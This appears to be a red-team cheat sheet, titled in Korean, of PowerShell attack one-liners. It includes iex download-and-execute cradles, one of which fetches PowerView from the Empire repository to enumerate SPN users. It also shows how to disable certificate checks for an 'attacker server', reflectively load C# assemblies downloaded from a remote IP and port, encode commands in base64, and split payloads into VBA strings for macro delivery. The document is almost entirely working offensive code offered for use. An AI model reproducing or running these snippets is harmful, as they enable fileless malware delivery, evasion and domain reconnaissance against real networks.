# 파워쉘

Powershell load and invoke&#x20;

```
iex(new-object net.webclient).downloadstring("<url>");<function>

iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1");get-domainuser -spn
```

Ignore SSL error if attacker server uses https&#x20;

```
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$a = (new-object net.webclient).downloadfile('<remote>','<localpath>')
```

C# Reflective loading&#x20;

```
$a = (New-Object net.webclient).DownloadData('http://<ip>:<port>/<c#-file>')
$b = [System.Reflection.Assembly]::Load($a)
$b.EntryPoint.Invoke($null, [Object[]]@( ,[String[]]@()))
$b.EntryPoint.Invoke($null, [Object[]]@( ,[String[]]@("triage")))
$b.EntryPoint.Invoke($null, [Object[]]@( ,[String[]]@("<param>")))
$b.EntryPoint.Invoke($null, [Object[]]@(@(,([String[]]@()))))
```

PowerSharpPack style template&#x20;

```
$a = (New-Object net.webclient).DownloadData('http://<ip>:<port>/<c#-file>')
$b = [System.Reflection.Assembly]::Load($a)
[<TOOLNAME>.<CLASS>]::main("")
```

C# Reflective loading main entrypoint - oneliner&#x20;

```
([System.Reflection.Assembly]::Load((New-Object net.webclient).DownloadData('http://<ip>:<port>/<c#file>'))).EntryPoint.Invoke($null, [Object[]]@(@(,([String[]]@()))))
```

C# Reflective loading with Namespace + Classname + Function name - oneliner&#x20;

```
[System.Reflection.Assembly]::Load((New-Object net.webclient).DownloadData('<location>')) | Out-Null; [<NameSpace>.<ClassName>]::<Function>(<params>)
```

base64 encoding&#x20;

```
$command= ' something something ' 
$encodedCommand = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($command))
powershell -en $encodedCommand 
```

VBA string formatter for powershell&#x20;

```
$s = @'
< powershell payload > 
'@
 
<# Just copy/paste everything below! #>
$EncodedText =[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))  

$array = @()
[System.Collections.ArrayList]$ArrayList = $array
$EncodedText -split '(.{300})' | Where-Object {
    $ArrayList.Add($_) | out-null
}

foreach ($item in $ArrayList){
    if([string]::IsNullOrEmpty($item)){
        continue
    }
    else{
        if($item -eq $ArrayList[-1]){
            '"' + $item +'"' 
            break 
        }
        '"' + $item + '" & _'
    }
    
}
```

VBA string formatter for already base64 encoded powershell payload&#x20;

```
$s = @'
< powershell payload > 
'@
 
<# Just copy/paste everything below! #>
#$EncodedText =[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))  

$EncodedText = $s

$array = @()
[System.Collections.ArrayList]$ArrayList = $array
$EncodedText -split '(.{300})' | Where-Object {
    $ArrayList.Add($_) | out-null
}

foreach ($item in $ArrayList){
    if([string]::IsNullOrEmpty($item)){
        continue
    }
    else{
        if($item -eq $ArrayList[-1]){
            '"' + $item +'"' 
            break 
        }
        '"' + $item + '" & _'
    }
}
```

